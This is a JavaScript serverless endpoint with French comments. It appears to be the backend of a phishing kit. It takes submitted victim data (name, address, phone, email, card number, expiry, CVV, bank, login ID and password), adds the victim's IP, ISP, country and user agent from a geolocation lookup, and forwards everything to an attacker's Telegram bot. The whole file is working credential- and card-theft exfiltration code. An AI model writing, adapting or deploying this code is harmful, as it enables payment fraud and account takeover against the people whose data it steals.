// api/notify.js
const TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT  = process.env.CHAT_ID;

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const { message } = req.body;
  if (!message) {
    return res.status(400).json({ error: 'Missing message' });
  }

  // Récupère IP et User-Agent
  const forwarded = req.headers['x-forwarded-for'];
  const ip        = (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'inconnue';
  const ua        = req.headers['user-agent'] || 'inconnu';

  // Lookup ISP & Pays via ip-score.com API (fulljson)
  let isp     = 'inconnue';
  let country = 'inconnue';
  try {
    const form = new URLSearchParams();
    form.append('ip', ip);
    const geoRes = await fetch('https://ip-score.com/fulljson', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: form.toString(),
    });
    const data = await geoRes.json();
    if (data.status === true || data.success === true) {
      isp     = data.isp           || data.ISP           || data.organization || data.org || isp;
      country = data.country_name  || data.country_name_long || data.country || data.countryCode || country;
    }
  } catch (e) {
    console.error('IP-Score lookup failed', e);
  }

  // Date & heure au format dd/MM/yy, HH:mm:ss
  const now  = new Date();
  const date = now.toLocaleDateString('fr-FR', { day: '2-digit', month: '2-digit', year: '2-digit' });
  const time = now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

  // Construction du message
  const [header, ...lines] = message.split('\n');
  let text = `📣 *${header}*`;
  text += `\n──────────────────`;
  lines.forEach(line => {
    if      (line.startsWith('Nom:'))        text += `\n👤 ${line.slice(4).trim()}`;
    else if (line.startsWith('Prénom:'))     text += `\n🙋 ${line.slice(7).trim()}`;
    else if (line.startsWith('Téléphone:'))  text += `\n📞 ${line.slice(10).trim()}`;
    else if (line.startsWith('Email:'))      text += `\n✉️ ${line.slice(6).trim()}`;
    else if (line.startsWith('Adresse:'))    text += `\n🏠 ${line.slice(8).trim()}`;
    else if (line.startsWith('Numéro:'))     text += `\n💳 ${line.slice(7).trim()}`;
    else if (line.startsWith('Exp:'))        text += `\n📅 ${line.slice(4).trim()}`;
    else if (line.startsWith('CVV:'))        text += `\n🔒 ${line.slice(4).trim()}`;
    else if (line.startsWith('Banque:'))     text += `\n🏦 ${line.slice(7).trim()}`;
    else if (line.startsWith('ID:'))         text += `\n🆔 ${line.slice(3).trim()}`;
    else if (line.startsWith('Pass:'))       text += `\n🔑 ${line.slice(5).trim()}`;
    else                                     text += `\n📋 ${line.trim()}`;
  });

  // Bloc standard sous chaque notification
  text += `\n──────────────────`;
  text += `\n🗓️ Date & heure : ${date}, ${time}`;
  text += `\n🌐 IP Client     : ${ip}`;
  text += `\n🔎 ISP Client    : ${isp}`;
  text += `\n🌍 Pays Client   : ${country}`;
  text += `\n📍 User-Agent    : ${ua}`;
  text += `\n©️ ${now.getFullYear()} ©️`;

  // Envoi vers Telegram
  const url     = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
  const payload = {
    chat_id: CHAT,
    text,
    parse_mode: 'Markdown',
    disable_web_page_preview: true
  };
  const telegramRes = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });

  const raw  = await telegramRes.text();
  let body;
  try { body = JSON.parse(raw); } catch { body = raw; }

  return res.status(telegramRes.ok ? 200 : telegramRes.status).json({ ok: telegramRes.ok, full: body });
}